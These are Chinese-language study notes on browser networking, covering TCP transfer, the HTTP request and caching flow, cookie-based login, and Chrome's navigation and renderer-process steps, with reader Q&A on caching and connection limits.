- **传输数据阶段**。在该阶段，接收端在接收到数据包之后，需要发送确认数据包给发送端。所以当发送端发送了一个数据包之后，在规定时间内没有接收到接收端反馈的确认消息，则判断为数据包丢失，并触发发送端的重发机制。同样，一个大的文件在传输过程中会被拆分成很多小的数据包，这些数据包到达接收端后，接收端会按照 TCP 头中的序号为其排序，从而保证组成完整的数据。
- **断开连接阶段**。数据传输完毕之后，就要终止连接，涉及到最后一个阶段“四次挥手”来保证双方都能断开连接。

TCP 为了保证数据传输的可靠性，牺牲了数据包的传输速度，因为“三次握手”和“数据包校验机制”等把传输过程中的数据包的数量提高了一倍。

1. 浏览器可以同时打开多个页签，他们端口一样吗？如果一样，数据怎么知道去哪个页签？端口一样的，网络进程知道每个 tcp 链接所对应的标签是那个，所以接收到数据后，会把数据分发给对应的渲染进程。

2. TCP 传送数据时 浏览器端就做渲染处理了么？如果前面数据包丢了 后面数据包先来是要等么？类似的那种实时渲染怎么处理？针对数据包的顺序性？接收到 http 响应头中的 content-type 类型时就开始准备渲染进程了，响应体数据一旦接受到便开始做 DOM 解析了！基于 http 不用担心数据包丢失的问题，因为丢包和重传都是在 tcp 层解决的。http 能保证数据按照顺序接收的（也就是说，从 tcp 到 http 的数据就已经是完整的了，即便是实时渲染，如果发生丢包也得在重传后才能开始渲染）

3. http 和 websocket 都是属于应用层的协议吗？都是应用层协议，而且 websocket 名字取的比较有迷惑性，其实和 socket 完全不一样，可以把 websocket 看出是 http 的改造版本，增加了服务器向客户端主动发送消息的能力。

4. 关于 "数据在传输的过程中有可能会丢失或者出错"，丢失的数据包去哪里了？凭空消失了吗？出错的数据包又变成啥了？ 为什么会出错？比如网络波动，物理线路故障，设备故障，恶意程序拦截，网络阻塞等等

## HTTP 请求流程

HTTP 是一种允许**浏览器向服务器获取资源的协议**，是 Web 的基础，通常由浏览器发起请求，用来获取不同类型的文件，例如 HTML 文件、CSS 文件、JavaScript 文件、图片、视频等。

- 通常在第一次访问一个站点时，打开速度很慢，当再次访问这个站点时，速度就很快
- 当登录过一个网站之后，下次再访问该站点，就已经处于登录状态

要实现上面所说的能力，都是通过 http 协议中的**请求头和响应头字段**来实现的。

### 浏览器端发起 HTTP 请求流程

浏览器地址栏中输入 URL，浏览器的处理流程：

1. 构建请求行，浏览器构建请求行信息（如下所示），构建好后，浏览器准备发起网络请求。

```shell
GET /index.html HTTP1.1
```

2. 查找缓存，在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。其中，**浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术。**

   当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。这样做的好处有：

   - 缓解服务器端压力，提升性能（获取资源的耗时更短了）；
   - 对于网站来说，快速加载资源。

   如果缓存查找失败，就会进入网络请求过程。

3. 准备 IP 地址和端口浏览器使用 HTTP 协议作为应用层协议，用来**封装请求的文本信息**；并使用 TCP/IP 作传输层协议将它发到网络上，所以在 HTTP 工作开始之前，浏览器需要通过 TCP 与服务器建立连接。**HTTP 的内容是通过 TCP 的传输数据阶段来实现的。** ![img](https://static001.geekbang.org/resource/image/12/80/1277f342174b23f9442d3b27016d7980.png)

4. HTTP 网络请求的第一步是做什么呢？是和服务器建立 TCP 连接（建立连接需要 IP 地址和端口号），但是建立 TCP 连接前需要知道目标服务器的地址，所以要进行域名解析，当然 DNS 数据也有可能缓存。

   怎么获取 IP 地址和端口号呢？利用 URL 地址来获取 IP 和端口信息。IP 地址是数字标识，难以记忆，使用域名就好记多了。所以基于这个需求又出现了一个服务，负责把域名和 IP 地址做一一映射关系。这套域名映射为 IP 的系统就叫做“域名系统”，简称 DNS（Domain Name System）。

   **第一步浏览器会请求 DNS 获取域名对应的 IP。**当然浏览器还提供了 DNS 数据缓存服务，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。

   拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。

5. 等待 TCP 队列

   端口和 IP 地址都准备好了，那么下一步是不是可以建立 TCP 连接了呢？答案依然是“不一定”。**Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。** 当然，**如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。**（应用层的对头堵塞）

6. 建立 TCP 连接排队等待结束之后，在 HTTP 工作开始之前，浏览器通过 TCP 与服务器建立连接。

7. 发送 HTTP 请求一旦建立了 TCP 连接，浏览器就可以和服务器进行通信了。而 HTTP 中的数据正是在这个通信过程中传输的。 ![img](https://static001.geekbang.org/resource/image/b8/d7/b8993c73f7b60feb9b8bd147545c47d7.png)

首先浏览器会向服务器发送请求行，它包括了请求方法、请求 URI（Uniform Resource Identifier）和 HTTP 版本协议。发送请求行告诉服务器浏览器需要什么资源。

在浏览器发送请求行命令之后，请求头发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。

服务器会根据浏览器的请求信息来准备相应的内容，一旦服务器处理结束，便可以返回数据给浏览器。

工具软件 curl 来查看返回请求数据

```shell
curl -i https://time.geekbang.org/    -i是为了返回响应行、响应头和响应体的数据
```

![img](https://static001.geekbang.org/resource/image/3e/76/3e30476a4bbda49fd7cd4fd0ea09f076.png)

并不是所有的请求都可以被服务器处理的，那么一些无法处理或者处理出错的信息，怎么 办呢？

服务器会通过请求行的状态码来告诉浏览器它的处理结果，比如：1. 最常用的状态码是 200，表示处理成功； 如果没有找到页面，则会返回 404。

响应头包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。

发送完响应头后，继续发送响应体数据。

**断开连接**

通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：

```
Connection:Keep-Alive
```

那么 TCP 连接在响应数据发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度。一个 Web 页面中内嵌的图片就都来自同一个 Web 站点，如果初始化了一个持久连接，你就可以复用该连接，以请求其他资源，而不需要重新再建立新的 TCP 连接。

**重定向**

```
curl -I geekbang.org   //-I表示只需要获取响应头和响应行数据,不需要获取响应体的数据
```

![img](https://static001.geekbang.org/resource/image/28/43/28d5796c6ab7faa619ed8f1bd17b0843.jpg)

当输入的 url 和最后真正访问的 url 不同时，一般是走了重定向。响应行返回的状态码是 301，重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航。

如果第二次页面打开很快，主要原因是第一次加载页面过程中，缓存了一些耗时的数据。

哪些数据会被缓存？DNS 缓存和页面资源缓存这两块数据是会被浏览器缓存的。

DNS 缓存主要就是在浏览器本地把对应的 IP 和域名关联起来

**浏览器资源缓存：**

![img](https://static001.geekbang.org/resource/image/5f/08/5fc2f88a04ee0fc41a808f3481287408.png)

**服务器是通过什么方式让浏览器缓存数据？**

当服务器返回 HTTP 响应头给浏览器时，浏览器是通过响应头中的 Cache-Control 字段来设置是否缓存该资源。通常，我们还需要为这个资源设置一个缓存过期时长，而这个时长是通过 Cache-Control 中的 Max-age 参数来设置的，比如上图设置的缓存过期时间是 2000 秒。

```
Cache-Control:Max-age=2000
```

这也就意味着，在该缓存资源还未过期的情况下, 如果再次请求该资源，会直接返回缓存中的资源给浏览器。

但如果缓存过期了，浏览器则会继续发起网络请求，并且在 HTTP 请求头中带上：

```
If-None-Match:"4f80f-13c-3a1xb12a"
```

服务器收到请求头后，会根据 If-None-Match 的值来判断请求的资源是否有更新。

- 如果没有更新，就返回 304 状态码，相当于服务器告诉浏览器：“这个缓存可以继续使用，这次就不重复发送数据给你了”。

- 如果资源有更新，服务器就直接返回最新资源给浏览器。

简要来说，很多网站第二次访问能够秒开，是因为这些网站把很多资源都缓存在了本地，浏览器缓存直接使用本地副本来回应请求，而不会产生真实的网络请求，从而节省了时间。同时，DNS 数据也被浏览器缓存了，这又省去了 DNS 查询环节。

[HTTP 缓存](https://developer.mozilla.org/zh-CN/docs/web/http/caching)

**登录状态是如何保持的?**

服务器接收到浏览器提交的信息之后，查询后台，验证用户登录信息是否正确，如果正确的话，会生成一段表示用户身份的字符串，并把该字符串写到响应头的 Set-Cookie 字段里，如下所示，然后把响应头发送给浏览器。

```
Set-Cookie: UID=3431uad;
```

浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头里含有 Set-Cookie 字段的情况，浏览器就会把这个字段信息保存到本地。比如把 UID=3431uad 保持到本地。

当用户再次访问时，浏览器会发起 HTTP 请求，但在发起请求之前，浏览器会读取之前保存的 Cookie 数据，并把数据写进请求头里的 Cookie 字段里（如下所示），然后浏览器再将请求头发送给服务器。

```
Cookie: UID=3431uad;
```

服务器在收到 HTTP 请求头数据之后，就会查找请求头里面的“Cookie”字段信息，当查找到包含 UID=3431uad 的信息时，服务器查询后台，并判断该用户是已登录状态，然后生成含有该用户信息的页面数据，并把生成的数据发送给浏览器。

![img](https://static001.geekbang.org/resource/image/d9/b3/d9d6cefe8d3d6d84a37a626687c6ecb3.png)

如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保持到本地。当下次客户端再往该服务器发送请求时，客户端会自动在请求头中加入 Cookie 值后再发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到该用户的状态信息。

![img](https://static001.geekbang.org/resource/image/1b/6c/1b49976aca2c700883d48d927f48986c.png)

如果一个页面的网络加载时间过久，你是如何分析卡在哪个阶段的？

1 首先猜测最可能的出问题的地方，网络传输丢包比较严重，需要不断重传。然后通过 ping curl 看看对应的时延高不高。

2 然后通过 wireshake 看看具体哪里出了问题。

3 假如别人访问很快，自己电脑很慢，就要看看自己客户端是否有问题了。

4 使用 chrome network 面板，看那个 瀑布图 中每个阶段的含义，就可以判断问题出现在那个方向了，每个阶段的含义，https://developers.google.com/web/tools/chrome-devtools/network/reference#timing-explanation 举个例子 Content Download 如果太长，很有可能是下载的资源太大，但也有可能是网络慢导致的下载太慢，简单计算一下，在例如 Waiting (TTFB) 这个太长的话，有可能是网络慢，或者就是 后端处理时间过长导致的，至少可以排查掉前端原因，还有很多，例如 DNS lookup 等，但是最终要确认具体哪里慢，最好是结合系统日志去分析

在浏览器中访问的时候打开 network 面板，发现缓存的来源有的 from disk 有的是 from memory。对于资源什么情况下缓存到硬盘什么时候缓存到内存？

> 这是浏览器的三级缓存机制，使用 memory cache 比 disk cache 的访问速度要快。还有另外一种 cache，是 service worker 的 cache。
>
> Chrome employs two caches — an on-disk cache and a very fast in-memory cache. The lifetime of an in-memory cache is attached to the lifetime of a render process, which roughly corresponds to a tab. Requests that are answered from the in-memory cache are invisible to the web request API. If a request handler changes its behavior (for example, the behavior according to which requests are blocked), a simple page refresh might not respect this changed behavior. To make sure the behavior change goes through, call handlerBehaviorChanged() to flush the in-memory cache. But don't do it often; flushing the cache is a very expensive operation. You don't need to call handlerBehaviorChanged() after registering or unregistering an event listener.
>
> - Memory Cache : 内存缓存
>
> - Disk Cache：硬盘缓存
>
> 打开网页：查找 disk cache 中是否有匹配，如有则使用，如没有则发送网络请求普通刷新 (F5)：因 TAB 没关闭，因此 memory cache 是可用的，会被优先使用，其次才是 disk cache 强制刷新 (Ctrl + F5)：浏览器不使用缓存，因此发送的请求头部均带有 Cache-control: no-cache，服务器直接返回 200 和最新内容

1、没有 keep-alive 时，http 数据传输完成后，是由浏览器主动发起断开 TCP 连接，还是由服务器主动发起断开 TCP 连接？ 2、设置了 keep-alive 时，当关闭页面时，浏览器会发起断开 TCP 连接吗？如果不关闭页面，浏览器会一直保持这个 TCP 连接吗？ 3、设置了 keep-alive 时，如果浏览器出现故障时了（挂掉了），此时服务器保持的 TCP 连接多久会释放？

参考文章：https://blog.csdn.net/cccallen/article/details/8003324

浏览器刷新操作，ctrl+F5 和 F5 有什么区别？

> 一个是强制刷新，也就是资源都走网络。
>
> 一个是正常处理流程。
>
> 比如通过网络面板，打开一个站点，再使用强制刷新，可以看到如下信息 176 requests 3.1 MB transferred 3.5 MB resources Finish: 26.30 s DOMContentLoaded: 5.04 s Load: 14.88 s
>
> 如果使用正常的刷新，看到的信息如下： 171 requests 419 KB transferred 3.2 MB resources Finish: 25.09 s DOMContentLoaded: 1.41 s Load: 6.24 s
>
> 其中的 transferred 是真正的网络传输的数据，使用强制刷新，传输的数据体积就大多了，而且请求时间也变得更长了。
>
> ctrl+F5 强制刷新 http 请求会少了 if-none-match 字段，所以不会协商缓存，将直接强制从服务器请求资源；f5 则会进行协商缓存。

set cookie 会不会有安全问题？

> cookie 是不安全的，比如黑客可以通过一些手段插入一些脚本到你的页面里面（具体一些途径我们浏览器安全篇再讲），通过脚本获取到你的 cookie 数据，然后就可以利用 cookie 做一些坏事了。
>
> 当然也有一些方法规避，常用的一个是将部分 cookie 设置成 httponly 的属性，设置了 httponly 属性后 cookie，就无法通过 js 脚本来读取了，只是在发送 http 请求时候会被带上！

在做前端页面的时候，是否可以设置当前页面是否可以被缓存，以及哪些部分可以被缓存？还是说整个缓存机制都是由浏览器自己控制的？

> 是没有办法通过前端代码来控制缓存的，缓存是后端或者部署的同学来控制的，但是前端同学应该知道那些内容要被缓存，和后端或者部署的同学配合来打！

Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。 是指同一个域名下的 6 个并发请求么。我理解建立一个 tcp 连接，可以处理多个请求吧？

> http/1.1 一个 tcp 同时只能处理一个请求，浏览器会为每个域名维护 6 个 tcp 连接！
>
> 但是每个 tcp 连接是可以复用的，也就是处理完一个请求之后，不断开这个 tcp 连接，可以用来处理下个 http 请求！
>
> 不过 http2 是可以并行请求资源的，所以如果使用 http2，浏览器只会为每个域名维护一个 tcp 连接。

http2 同个域名只能维持一个长连接。那我现在打开了一个域名下的 a 页面，然后又打开了这个域名的 b 页面，那这个 b 页面是新开一个 tcp 长连接吗？还是会用 a 页面的长连接？换句话说，维持一个 tcp 长连接，指的是一个页面维持一个？还是整个浏览器维持一个？还是同一个渲染进程维持一个？

> 浏览器为用同一个域名只维护一个 TCP 连接。
>
> 你从通过 Chrome 打开 chrome://net-export/ 这个地址，然后记录网络过程。
>
> 最后在使用这个https://netlog-viewer.appspot.com/ 打开你日志文件，就能看到 h2 的详细信息了。

同域名只能建立 6 个 tcp 链接的话，那加载大量图片或者其他资源的时候不是很卡呢？

> 是的，通常如图片这种静态资源都是直接配置到 cdn 上的(域名发散)。

## 导航流程

**从输入 URL 到页面展示，这中间发生了什么？**

![img](https://static001.geekbang.org/resource/image/92/5d/92d73c75308e50d5c06ad44612bcb45d.png)

整个过程需要各个进程之间的配合。

- 浏览器进程主要负责**用户交互、子进程管理和文件储存等**功能
- 网络进程是**为渲染进程和浏览器进程等提供网络下载功能**
- 渲染进程的**主要职责是把从网络下载的 HTML、JavaScript、CSS、图片等资源解析为可以显示和交互的页面**。因为渲染进程所有的内容都是通过网络获取的，会存在一些恶意代码利用浏览器漏洞对系统进行攻击，所以运行在渲染进程里面的代码是不被信任的。

1. **浏览器进程**接收到用户输入的 URL 请求，便通过 IPC 进程间通信将该 URL 转发给网络进程
2. 在网络进程中发起真正的 URL 请求（可能走缓存）
3. 然后服务器返回 HTTP 数据到网络进程，网络进程解析 HTTP 出来响应头数据，并将其转发给浏览器进程
4. 浏览器进程接收到网络进程的响应头数据之后，发送“提交导航 (CommitNavigation)”消息到渲染进程,发送 CommitNavigation 时会携带响应头等基本信息
5. 渲染进程接收到“提交导航”的消息之后，便开始准备接收 HTML 数据，接收数据的方式是直接和网络进程建立数据管道
6. 渲染进程会向浏览器进程“确认提交”，这是告诉浏览器进程：“已经准备好接受和解析页面数据了”
7. 浏览器进程接收到渲染进程“提交文档”的消息之后，便开始移除之前旧的文档，然后更新浏览器进程中的页面状态

**用户发出 URL 请求到页面开始解析的这个过程，就叫做导航。**

### 用户输入

当用户在地址栏中输入一个查询关键字时，地址栏会判断输入的关键字是搜索内容，还是请求的 URL。

- 如果是搜索内容，会使用浏览器默认的搜索引擎，来**合成新的带搜索关键字的 URL**。

- 如果判断输入内容符合 URL 规则，比如输入的是 baidu.com，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL

当用户输入关键字并键入回车之后，这意味着当前页面即将要被替换成新的页面，不过在这个流程继续之前，浏览器还给了当前页面一次执行 beforeunload 事件的机会，beforeunload 事件允许页面在退出之前执行一些数据清理操作，还可以询问用户是否要离开当前页面，比如当前页面可能有未提交完成的表单等情况，因此用户可以通过 beforeunload 事件来取消导航，让浏览器不再执行任何后续工作。

当前页面没有监听 beforeunload 事件或者同意了继续后续流程，那么浏览器便进入下图的状态：

![img](https://static001.geekbang.org/resource/image/fa/30/fad33fc7c5f2bdf4e20cac7691484130.png)

从图中可以看出，当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为新的页面。因为需要等待提交文档阶段，页面内容才会被替换。

### URL 请求过程

进入了页面资源请求过程。这时，浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。

**网络进程**会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么直接进入网络请求流程。

**请求前的第一步是要进行 DNS 解析**，以获取请求域名的服务器 IP 地址。**如果请求协议是 HTTPS，那么还需要建立 TLS 连接。**

接下来利用 IP 地址和服务器**建立 TCP 连接**。**连接建立之后**，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。

服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并**发给网络进程**。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容。

#### 重定向

在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求，一切又重头开始了。

```shell
curl -I http://time.geekbang.org/   // curl -I + URL的命令是接收服务器返回的响应头的信息
```

![img](https://static001.geekbang.org/resource/image/65/7e/655cbf32dd4bb6f9decc5c7f9a535a7e.png)

服务器会通过重定向的方式把所有 HTTP 请求转换为 HTTPS 请求。也就是说你使用 HTTP 向极客时间服务器请求时，服务器会返回一个包含有 301 或者 302 状态码响应头，并把响应头的 Location 字段中填上 HTTPS 的地址，这就是告诉了浏览器要重新导航到新的地址上。

```
curl -I https://time.geekbang.org/
```

![img](https://static001.geekbang.org/resource/image/0c/43/0c4987fe5d05646fa8245d8cc50d1a43.png)

在导航过程中，如果服务器响应行的 状态码包含了 301、302 一类的跳转信息，浏览器会跳转到新的地址继续导航；如果响应 行是 200，那么表示浏览器可以继续处理该请求。

#### 响应数据类型处理

URL 请求的数据类型，有时候是一个下载类型，有时候是正常的 HTML 页面，那么浏览器是如何区分它们呢？

Content-Type 是 HTTP 头中一个非常重要的字段， 它**告诉浏览器**，服务器返回的响应体数据是什么类型，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。

```
url -I https://time.geekbang.org/
```

![img](https://static001.geekbang.org/resource/image/89/1c/8951e161b5f44a73e52c16b631a63e1c.png)

响应头中的 Content-type 字段的值是 text/html，这就是**告诉浏览器**，服务器返回的数据是 HTML 格式。

curl 来请求安装包的地址:

```
curl -I https://res001.geekbang.org/apps/geektime/android/2.3.1/official/geektime_2.3.1_20190527-2136_offical.apk
```

![img](https://static001.geekbang.org/resource/image/59/3b/595902748d7d4c2f9c1d4783962ae43b.png)

Content-Type 的值是 application/octet-stream，显示数据是**字节流类型**的，通常情况下，浏览器会按照**下载类型**来处理该请求。

需要注意的是，如果服务器配置 Content-Type 不正确，比如将 text/html 类型配置成 application/octet-stream 类型，那么浏览器可能会曲解文件内容，比如会将一个本来是用来展示的页面，变成了一个下载文件。

不同 Content-Type 的后续处理流程也截然不同。如果 Content-Type 字段的值被浏览器判断为下载类型，那么该请求会被提交给浏览器的**下载管理器**，同时该 URL 请求的导航流程就此结束。但如果是 HTML，那么浏览器则会继续进行导航流程。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。

### 准备渲染进程

默认情况下，Chrome 会为每个页面分配一个渲染进程，也就是说，每打开一个新页面就会配套创建一个新的渲染进程。但是，也有一些例外，在某些情况下，浏览器会让多个页面直接运行在同一个渲染进程中。

比如我从极客时间的首页里面打开了另外一个页面——算法训练营，我们看下图的 Chrome 的任务管理器截图：

![img](https://static001.geekbang.org/resource/image/d8/28/d8fe2afbd8ea2d4a8d8cc4bb14c50f28.png)

从图中可以看出，打开的这三个页面都是运行在同一个渲染进程中，进程 ID 是 23601。

**那什么情况下多个页面会同时运行在一个渲染进程中呢？**

先了解下什么是同一站点（same-site）。具体地讲，我们将“同一站点”定义为根域名（例如，geekbang.org）加上协议（例如，https:// 或者 http://），还包含了该根域名下的所有子域名和不同的端口，比如下面这三个：

```
https://time.geekbang.org
https://www.geekbang.org
https://www.geekbang.org:8080
```

它们都是属于同一站点，因为它们的协议都是 HTTPS，而且根域名也都是 geekbang.org。

**Chrome 的默认策略是，每个标签对应一个渲染进程。但如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程(不一定，得看站点)。官方把这个默认策略叫 process-per-site-instance。**

> 连接里面使用了 rel="noopener noreferrer"这个属性。 这个涉及到安全长话短说，先看阿里这个网站的连接是下面这种形`<a target="_blank" rel="noopener noreferrer" class="hover" href="https://linkmarket.aliyun.com/hardware_store?spm=a2c3t.11219538.iot-navBar.62.4b5a51e7u2sXtw" data-spm-anchor-id="a2c3t.11219538.iot-navBar.62">硬件商城</a>`使用 noopener noreferrer 就是告诉浏览器，新打开的子窗口不需要访问父窗口的任何内容，这是为了防止一些钓鱼网站窃取父窗口的信息。 浏览器在打开新页面时，解析到含有 noopener noreferrer 时，就知道他们不需要共享页面内容，所以这时候浏览器就会让新链接在一个新页面中打开了。

访问不同站点得不同页面：

![img](https://static001.geekbang.org/resource/image/fb/74/fba1dd05f0aeba93a5cb25f305971274.png)

**总结来说，打开一个新页面采用的渲染进程策略就是：（面试）**

通常情况下，打开新的页面都会使用单独的渲染进程；

如果从 A 页面打开 B 页面，且 A 和 B 都属于同一站点的话，那么 B 页面复用 A 页面的渲染进程；

如果是其他情况，浏览器进程则会为 B 创建一个新的渲染进程。

渲染进程准备好之后，还不能立即进入**文档解析状态**，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。

### 提交文档

首先要明确一点，这里的“文档”是指 URL 请求的**响应体数据**。

所谓提交文档，就是指浏览器进程将网络进程接收到的 HTML 数据提交给渲染进程，具体流程是这样的：

1. 首先当浏览器进程接收到网络进程的响应头数据之后（“提交文档”的消息是由浏览器进程发出的），便向渲染进程发起“提交文档”的消息；
2. 渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“管道”；
3. 渲染进程是边接收网络进程传输过来的 html 一边解析的，等文档数据传输（网络请求回完所有分段的数据包后）完成之后，渲染进程会返回“确认提交”的消息给浏览器进程；
4. 浏览器进程在收到“确认提交”的消息后，会更新浏览器界面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面

其中，当渲染进程确认提交之后，更新内容如下图所示：

![img](https://static001.geekbang.org/resource/image/d3/b8/d3c5a6188b09b5b57af439005ae7dfb8.png)

这也就解释了为什么在浏览器的地址栏里面输入了一个地址后，之前的页面没有立马消失，而是要加载一会儿才会更新页面。

到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了。

### 渲染阶段

一旦文档被提交，渲染进程便开始页面解析和子资源加载（边加载边解析）。一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。

![img](https://static001.geekbang.org/resource/image/be/58/bef45eb5b01c34e328486004feedd658.png)

1，用户输入 url 并回车

2，浏览器进程检查 url，组装协议，构成完整的 url

3，浏览器进程通过进程间通信（IPC）把 url 请求发送给网络进程

4，网络进程接收到 url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程

5，如果没有，网络进程向 web 服务器发起 http 请求（网络请求），请求流程如下：

​ 5.1 进行 DNS 解析，获取服务器 ip 地址，端口

​ 5.2 利用 ip 地址和服务器建立 tcp 连接

​ 5.3 构建请求头信息

​ 5.4 发送请求头信息

​ 5.5 服务器响应后，网络进程接收响应头和响应信息，并解析响应内容

6，网络进程解析响应流程；

​ 6.1 检查状态码，如果是 301/302，则需要重定向，从 Location 自动中读取地址，重新进行第 4 步 ，如果是 200，则继续处理请求。

​ 6.2 200 响应处理，检查响应类型 Content-Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，不再进行

后续的渲染，如果是 html 则通知浏览器进程准备渲染进程准备进行渲染。

7，准备渲染进程

​ 7.1 浏览器进程检查当前 url 是否和之前打开的渲染进程根域名是否相同，如果相同，则复用原来的进程，如果不同，则开启新的渲染进程

8. 传输数据、更新状态

   8.1 渲染进程准备好后，浏览器向渲染进程发起“提交文档”的消息，渲染进程接收到消息和网络进程建立传输数据的“管道” 8.2 渲染进程接收完数据后，向浏览器发送“确认提交”

   8.3 浏览器进程接收到确认消息后更新浏览器界面状态：安全、地址栏 url、前进后退的历史状态、更新 web 页面。

1. 用户输入 URL，浏览器会根据用户输入的信息判断是搜索还是网址，如果是搜索内容，就将搜索内容+默认搜索引擎合成新的 URL；如果用户输入的内容符合 URL 规则，浏览器就会根据 URL 协议，在这段内容上加上协议合成合法的 URL
1. 用户输入完内容，按下回车键，浏览器导航栏显示 loading 状态，但是页面还是呈现前一个页面，这是因为新页面的响应数据还没有获得
1. 浏览器进程浏览器构建请求行信息，会通过进程间通信（IPC）将 URL 请求发送给网络进程 GET /index.html HTTP1.1
1. 网络进程获取到 URL，先去本地缓存中查找是否有缓存文件，如果有，拦截请求，直接 200 返回；否则，进入网络请求过程
1. 网络进程请求 DNS 返回域名对应的 IP 和端口号，如果之前 DNS 数据缓存服务缓存过当前域名信息，就会直接返回缓存信息；否则，发起请求获取根据域名解析出来的 IP 和端口号，如果没有端口号，http 默认 80，https 默认 443。如果是 https 请求，还需要建立 TLS 连接。
1. Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。如果当前请求数量少于 6 个，会直接建立 TCP 连接。
1. TCP 三次握手建立连接，http 请求加上 TCP 头部——包括源端口号、目的程序端口号和用于校验数据完整性的序号，向下传输
1. 网络层在数据包上加上 IP 头部——包括源 IP 地址和目的 IP 地址，继续向下传输到底层
1. 底层通过物理网络传输给目的服务器主机
1. 目的服务器主机网络层接收到数据包，解析出 IP 头部，识别出数据部分，将解开的数据包向上传输到传输层
1. 目的服务器主机传输层获取到数据包，解析出 TCP 头部，识别端口，将解开的数据包向上传输到应用层
1. 应用层 HTTP 解析请求头和请求体，如果需要重定向，HTTP 直接返回 HTTP 响应数据的状态 code301 或者 302，同时在请求头的 Location 字段中附上重定向地址，浏览器会根据 code 和 Location 进行重定向操作；如果不是重定向，首先服务器会根据 请求头中的 If-None-Match 的值来判断请求的资源是否被更新，如果没有更新，就返回 304 状态码，相当于告诉浏览器之前的缓存还可以使用，就不返回新数据了；否则，返回新数据，200 的状态码，并且如果想要浏览器缓存数据的话，就在相应头中加入字段： Cache-Control:Max-age=2000 响应数据又顺着应用层——传输层——网络层——网络层——传输层——应用层的顺序返回到网络进程
1. 数据传输完成，TCP 四次挥手断开连接。如果，浏览器或者服务器在 HTTP 头部加上如下信息，TCP 就一直保持连接。保持 TCP 连接可以省下下次需要建立连接的时间，提示资源加载速度 Connection:Keep-Alive
1. 网络进程将获取到的数据包进行解析，根据响应头中的 Content-type 来判断响应数据的类型，如果是字节流类型，就将该请求交给下载管理器，该导航流程结束，不再进行；如果是 text/html 类型，就通知浏览器进程获取到文档准备渲染
1. 浏览器进程获取到通知，根据当前页面 B 是否是从页面 A 打开的并且和页面 A 是否是同一个站点（根域名和协议一样就被认为是同一个站点），如果满足上述条件，就复用之前网页的进程，否则，新创建一个单独的渲染进程
1. 浏览器会发出“提交文档”的消息给渲染进程，渲染进程收到消息后，会和网络进程建立传输数据的“管道”，文档数据传输完成后，渲染进程会返回“确认提交”的消息给浏览器进程
1. 浏览器收到“确认提交”的消息后，会更新浏览器的页面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 web 页面，此时的 web 页面是空白页
1. 渲染进程对文档进行页面解析和子资源加载，HTML 通过 HTM 解析器转成 DOM Tree（二叉树类似结构的东西），CSS 按照 CSS 规则和 CSS 解释器转成 CSSOM TREE，两个 tree 结合，形成 render tree（不包含 HTML 的具体元素和元素要画的具体位置），通过 Layout 可以计算出每个元素具体的宽高颜色位置，结合起来，开始绘制，最后显示在屏幕中新页面显示出来

https://linkmarket.aliyun.com内新开的页面都是新开一个渲染进程，能帮忙解释下吗？（右键在新页面打开的页面默认在新的渲染进程中渲染。）

